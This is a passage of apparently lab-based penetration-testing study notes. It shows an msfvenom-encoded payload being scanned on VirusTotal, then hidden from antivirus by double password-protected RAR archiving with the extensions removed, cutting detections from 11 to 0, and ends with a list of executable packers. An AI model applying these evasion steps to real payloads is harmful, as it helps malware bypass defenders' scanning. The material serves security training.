+x86/shikata_ga_nai chosen with final size 135
+Payload size: 135 bytes
+Saved as: /home/user/test.js
+```
+
+... and:
+
+```bash
+d41y@htb[/htb]$ cat test.js
+
+�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
+<...SNIP...>
+�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
+```
+
+If you check against VirusTotal to get a detection baseline from the payload you generated, the results will be the following:
+
+```bash
+d41y@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
+
+[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
+[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
+[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
+[*] communicate, publish, publicly perform, publicly display and distribute such
+[*] content. To read the complete Terms of Service for VirusTotal, please go to the
+[*] following link:
+[*] https://www.virustotal.com/en/about/terms-of-service/
+[*] 
+[*] If you prefer your own API key, you may obtain one at VirusTotal.
+
+[*] Enter 'Y' to acknowledge: Y
+
+
+[*] Using API key: <API key>
+[*] Please wait while I upload test.js...
+[*] VirusTotal: Scan request successfully queued, come back later for the report
+[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
+[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
+[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105
+[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167047
+[*] Requesting the report...
+[*] Received code 0. Waiting for another 60 seconds...
+[*] Analysis Report: test.js (11 / 59): <...SNIP...>
+====================================================================================================
+
+ Antivirus             Detected  Version               Result                             Update
+ ---------             --------  -------               ------                             ------
+ ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510
+ AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
+ Acronis               false     1.2.0.108                                                20220426
+ Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510
+ AhnLab-V3             false     3.21.3.10230                                             20220510
+ Antiy-AVL             false     3.0                                                      20220510
+ Arcabit               false     1.0.0.889                                                20220510
+ Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
+ Avira                 false     8.3.3.14                                                 20220510
+ Baidu                 false     1.0.0.2                                                  20190318
+ BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510
+ BitDefenderTheta      false     7.2.37796.0                                              20220428
+ Bkav                  false     1.3.0.9899                                               20220509
+ CAT-QuickHeal         false     14.00                                                    20220510
+ CMC                   false     2.10.2019.1                                              20211026
+ ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509
+ Comodo                false     34607                                                    20220510
+ Cynet                 false     4.0.0.27                                                 20220510
+ Cyren                 false     6.5.1.2                                                  20220510
+ DrWeb                 false     7.0.56.4040                                              20220510
+ ESET-NOD32            false     25243                                                    20220510
+ Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510
+ F-Secure              false     18.10.978.51                                             20220510
+ FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510
+ Fortinet              false     6.2.142.0                                                20220510
+ GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510
+ Gridinsoft            false     1.0.77.174                                               20220510
+ Ikarus                false     6.0.24.0                                                 20220509
+ Jiangmin              false     16.0.100                                                 20220509
+ K7AntiVirus           false     12.12.42275                                              20220510
+ K7GW                  false     12.12.42275                                              20220510
+ Kaspersky             false     21.0.1.45                                                20220510
+ Kingsoft              false     2017.9.26.565                                            20220510
+ Lionic                false     7.5                                                      20220510
+ MAX                   true      2019.9.16.1           malware (ai score=89)              20220510
+ Malwarebytes          false     4.2.2.27                                                 20220510
+ MaxSecure             false     1.0.0.1                                                  20220510
+ McAfee                false     6.0.6.653                                                20220510
+ McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510
+ MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510
+ Microsoft             false     1.1.19200.5                                              20220510
+ NANO-Antivirus        false     1.0.146.25588                                            20220510
+ Panda                 false     4.6.4.2                                                  20220509
+ Rising                false     25.0.0.27                                                20220510
+ SUPERAntiSpyware      false     5.6.0.1032                                               20220507
+ Sangfor               false     2.14.0.0                                                 20220507
+ Sophos                false     1.4.1.0                                                  20220510
+ Symantec              false     1.17.0.0                                                 20220510
+ TACHYON               false     2022-05-10.02                                            20220510
+ Tencent               false     1.0.0.1                                                  20220510
+ TrendMicro            false     11.0.0.1006                                              20220510
+ TrendMicro-HouseCall  false     10.0.0.1040                                              20220510
+ VBA32                 false     5.0.0                                                    20220506
+ ViRobot               false     2014.3.20.0                                              20220510
+ VirIT                 false     9.5.191                                                  20220509
+ Yandex                false     5.5.2.24                                                 20220428
+ Zillya                false     2.0.0.4627                                               20220509
+ ZoneAlarm             false     1.0                                                      20220510
+ Zoner                 false     2.2.2.0                                                  20220509
+```
+
+Now, try archiving it two times, passwording both archives upon creation, and removing the .rar/.zip/.7z extension from their names.
+
+#### Archiving the Payload
+
+```bash
+d41y@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+d41y@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+d41y@htb[/htb]$ rar a ~/test.rar -p ~/test.js
+
+Enter password (will not be echoed): ******
+Reenter password: ******
+
+RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
+Trial version             Type 'rar -?' for help
+Evaluation copy. Please register.
+
+Creating archive test.rar
+Adding    test.js                                                     OK 
+Done
+
+...
+
+d41y@htb[/htb]$ ls
+
+test.js   test.rar
+```
+
+#### Removing the .rar Extension
+
+```bash
+d41y@htb[/htb]$ mv test.rar test
+d41y@htb[/htb]$ ls
+
+test   test.js
+```
+
+#### Archiving the Payload again
+
+```bash
+d41y@htb[/htb]$ rar a test2.rar -p test
+
+Enter password (will not be echoed): ******
+Reenter password: ******
+
+RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
+Trial version             Type 'rar -?' for help
+Evaluation copy. Please register.
+
+Creating archive test2.rar
+Adding    test                                                        OK 
+Done
+```
+
+#### Removing the .rar Extension
+
+```bash
+d41y@htb[/htb]$ mv test2.rar test2
+d41y@htb[/htb]$ ls
+
+test   test2   test.js
+```
+
+The test2 file is the final .rar archive with the extension deleted from the name. After that, you can proceed to upload it on VirusTotal for another check.
+
+```bash
+d41y@htb[/htb]$ msf-virustotal -k <API key> -f test2
+
+[*] Using API key: <API key>
+[*] Please wait while I upload test2...
+[*] VirusTotal: Scan request successfully queued, come back later for the report
+[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d
+[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429
+[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
+[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167804
+[*] Requesting the report...
+[*] Received code 0. Waiting for another 60 seconds...
+[*] Received code -2. Waiting for another 60 seconds...
+[*] Received code -2. Waiting for another 60 seconds...
+[*] Received code -2. Waiting for another 60 seconds...
+[*] Received code -2. Waiting for another 60 seconds...
+[*] Received code -2. Waiting for another 60 seconds...
+[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
+=================================================================================================
+
+ Antivirus             Detected  Version         Result  Update
+ ---------             --------  -------         ------  ------
+ ALYac                 false     1.1.3.1                 20220510
+ Acronis               false     1.2.0.108               20220426
+ Ad-Aware              false     3.0.21.193              20220510
+ AhnLab-V3             false     3.21.3.10230            20220510
+ Antiy-AVL             false     3.0                     20220510
+ Arcabit               false     1.0.0.889               20220510
+ Avira                 false     8.3.3.14                20220510
+ BitDefender           false     7.2                     20220510
+ BitDefenderTheta      false     7.2.37796.0             20220428
+ Bkav                  false     1.3.0.9899              20220509
+ CAT-QuickHeal         false     14.00                   20220510
+ CMC                   false     2.10.2019.1             20211026
+ ClamAV                false     0.105.0.0               20220509
+ Comodo                false     34606                   20220509
+ Cynet                 false     4.0.0.27                20220510
+ Cyren                 false     6.5.1.2                 20220510
+ DrWeb                 false     7.0.56.4040             20220510
+ ESET-NOD32            false     25243                   20220510
+ Emsisoft              false     2021.5.0.7597           20220510
+ F-Secure              false     18.10.978.51            20220510
+ FireEye               false     35.24.1.0               20220510
+ Fortinet              false     6.2.142.0               20220510
+ Gridinsoft            false     1.0.77.174              20220510
+ Jiangmin              false     16.0.100                20220509
+ K7AntiVirus           false     12.12.42275             20220510
+ K7GW                  false     12.12.42275             20220510
+ Kingsoft              false     2017.9.26.565           20220510
+ Lionic                false     7.5                     20220510
+ MAX                   false     2019.9.16.1             20220510
+ Malwarebytes          false     4.2.2.27                20220510
+ MaxSecure             false     1.0.0.1                 20220510
+ McAfee-GW-Edition     false     v2019.1.2+3728          20220510
+ MicroWorld-eScan      false     14.0.409.0              20220510
+ NANO-Antivirus        false     1.0.146.25588           20220510
+ Panda                 false     4.6.4.2                 20220509
+ Rising                false     25.0.0.27               20220510
+ SUPERAntiSpyware      false     5.6.0.1032              20220507
+ Sangfor               false     2.14.0.0                20220507
+ Symantec              false     1.17.0.0                20220510
+ TACHYON               false     2022-05-10.02           20220510
+ Tencent               false     1.0.0.1                 20220510
+ TrendMicro-HouseCall  false     10.0.0.1040             20220510
+ VBA32                 false     5.0.0                   20220506
+ ViRobot               false     2014.3.20.0             20220510
+ VirIT                 false     9.5.191                 20220509
+ Yandex                false     5.5.2.24                20220428
+ Zillya                false     2.0.0.4627              20220509
+ ZoneAlarm             false     1.0                     20220510
+ Zoner                 false     2.2.2.0                 20220509
+```
+
+As you can see from the above, this is an excellent way to transfer data both to and from the target host.
+
+### Packers
+
+The term "packer" refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.
+
+Popular packer software:
+
+- UPX packer
+- The Enigma Protector
+- MPRESS
+- Alternate EXE Packer
+- ExeStealth
+- Morphine
+- MEW
+- Themida
